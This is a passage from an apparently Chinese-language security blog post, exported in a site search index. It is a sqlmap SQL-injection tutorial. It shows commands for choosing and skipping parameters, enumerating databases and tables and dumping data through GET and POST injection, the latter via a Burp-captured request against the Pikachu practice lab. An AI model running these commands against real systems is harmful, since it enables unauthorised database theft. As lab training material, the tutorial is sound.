</span><br><span class="line"></span><br><span class="line">--对id进行探测</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u url -p &quot;id,name&quot; --dbs </span><br><span class="line"></span><br><span class="line">--对id和name都进行探测</span><br></pre></td></tr></table></figure><p>2、–skip，忽略探测的参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u url --level 5 --skip host --dbs </span><br><span class="line"></span><br><span class="line">--5级对所有存在的注入点进行探测，这里忽略了host</span><br></pre></td></tr></table></figure><h3 id="get型"><a href="#get型" class="headerlink" title="get型"></a>get型</h3><p>1、查看所有「数据库」</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://xx/?id=1&#x27; --dbs</span><br></pre></td></tr></table></figure><p>2.查看「数据表」</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://xx/?id=1&#x27; -D [数据库名] --tables</span><br></pre></td></tr></table></figure><p>3.查看「数据」</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://xx/?id=1&#x27; -D [数据库名] -T [数据库表名] --dump</span><br></pre></td></tr></table></figure><h3 id="post型"><a href="#post型" class="headerlink" title="post型"></a>post型</h3><p>1.使用bp抓包并标注注入点（在后面加*）</p><p><img src="/../images/sql%E6%B3%A8%E5%85%A5.assets/sqlmappost1.png"></p><p>复制数据包内容到kali并保存为文档</p><p><img src="/../images/sql%E6%B3%A8%E5%85%A5.assets/sqlmappost2.png"></p><p>使用sqlmap注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 1.txt --dbs</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../images/sql%E6%B3%A8%E5%85%A5.assets/sqlmappost3.png"></p><p><img src="/../images/sql%E6%B3%A8%E5%85%A5.assets/sqlmappost4.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 1.txt -D pikachu --tables</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../images/sql%E6%B3%A8%E5%85%A5.assets/sqlmappost5.png"></p><p>余下步骤与get型一样</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
